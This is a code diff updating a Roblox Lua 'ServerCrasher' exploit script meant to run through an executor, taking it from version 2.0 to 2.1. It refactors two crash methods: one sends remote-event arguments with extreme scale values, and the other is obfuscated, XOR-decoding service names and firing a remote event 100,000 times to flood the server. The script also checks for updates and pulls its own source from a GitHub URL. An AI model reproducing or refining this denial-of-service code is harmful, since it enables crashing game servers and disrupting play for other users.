@@ -10,7 +10,8 @@ There are currently 2 methods:
 
 local Level2Execution = false -- Turn this on only if you have a lvl 2 executor without HTTP support and custom functions or the script doesnt run on your executor
 
-local latestVersion:number = 2.0
+local instant = false -- set to true if you want to instantly crash without having to wait 5 seconds
+local latestVersion:number = 2.1
 local method:number = 2
 local size:number = 100000 -- only for 1st method
 
@@ -19,8 +20,8 @@ local size:number = 100000 -- only for 1st method
 if Level2Execution == false then
 	latestVersion = tonumber(game:HttpGet("https://raw.githubusercontent.com/SourceDNR/Apollo/refs/heads/main/extra/newestCrasherVersion"))
 end
-task.wait(1)
-local version = 2.0
+
+local version = 2.1
 
 local function randomString()
 	local length = math.random(60,80)
@@ -51,21 +52,8 @@ local function message(text:string, duration:number)
 	end
 end
 
-if version < latestVersion then
-	if setclipboard then
-		setclipboard(game:HttpGet("https://raw.githubusercontent.com/SourceDNR/Apollo/refs/heads/main/ServerCrasher.lua"))
-		message("You're running an outdated version of this script, the new script has been copied to your clipboard.", 10)
-		error("l")
-	else
-		message("You're running an outdated version of this script, please use the new script (Github account: SourceDNR)", 10)
-		error("l")
-	end
-end
-
-if method == 1 then
-	message("Crashing server in 5 seconds | Method selected: ".. method, 5)
-	task.wait(5)
-	local args = {
+local function crash1()
+    local args = {
 		[1] = {
 			["SwimAnimation"] = 0,
 			["DepthScale"] = size - (size / 5),
@@ -107,9 +95,38 @@ if method == 1 then
 		if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
 			game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead) 
 		end
+	end 
+end
+
+local function crash2()
+    local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9) local v10={};for v14=1, #v8 do v6(v10,v0(v4(v1(v2(v8,v14,v14 + 1 )),v1(v2(v9,1 + (v14% #v9) ,1 + (v14% #v9) + 1 )))%256 ));end return v5(v10);end for v11=1 -0 ,142559 -42559  do local v12=1065 -(68 + 997) ;local v13;while true do if (v12==(1271 -(226 + 1044))) then task.wait();break;end if ((0 -0)==v12) then v13={[118 -(32 + 85) ]=v7("\243\209\206\49","\126\177\163\187\69\134\219\167")};game:GetService(v7("\17\200\58\201\245\32\204\62\192\248\16\217\37\215\253\36\200","\156\67\173\74\165")):WaitForChild(v7("\17\161\76\24\168\53","\38\84\215\41\118\220\70")):WaitForChild(v7("\115\30\35\0\255\83\2\39\0\219\70\19\44\6","\158\48\118\66\114")):FireServer(unpack(v13));v12=1 + 0 ;end end end 
+end
+
+if version < latestVersion then
+	if setclipboard then
+		setclipboard(game:HttpGet("https://raw.githubusercontent.com/SourceDNR/Apollo/refs/heads/main/ServerCrasher.lua"))
+		message("You're running an outdated version of this script, the new script has been copied to your clipboard.", 10)
+		error("l")
+	else
+		message("You're running an outdated version of this script, please use the new script (Github account: SourceDNR)", 10)
+		error("l")
 	end
-else
+end
+
+if method == 1 then
+    if instant == false then
 	message("Crashing server in 5 seconds | Method selected: ".. method, 5)
 	task.wait(5)
-	local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9) local v10={};for v14=1, #v8 do v6(v10,v0(v4(v1(v2(v8,v14,v14 + 1 )),v1(v2(v9,1 + (v14% #v9) ,1 + (v14% #v9) + 1 )))%256 ));end return v5(v10);end for v11=1 -0 ,142559 -42559  do local v12=1065 -(68 + 997) ;local v13;while true do if (v12==(1271 -(226 + 1044))) then task.wait();break;end if ((0 -0)==v12) then v13={[118 -(32 + 85) ]=v7("\243\209\206\49","\126\177\163\187\69\134\219\167")};game:GetService(v7("\17\200\58\201\245\32\204\62\192\248\16\217\37\215\253\36\200","\156\67\173\74\165")):WaitForChild(v7("\17\161\76\24\168\53","\38\84\215\41\118\220\70")):WaitForChild(v7("\115\30\35\0\255\83\2\39\0\219\70\19\44\6","\158\48\118\66\114")):FireServer(unpack(v13));v12=1 + 0 ;end end end
+	crash1()
+	else
+	    crash1()
+	end
+else
+    if instant == false then
+	    message("Crashing server in 5 seconds | Method selected: ".. method, 5)
+	    task.wait(5)
+	    crash2()
+	else
+	    crash2()
+    end
 end
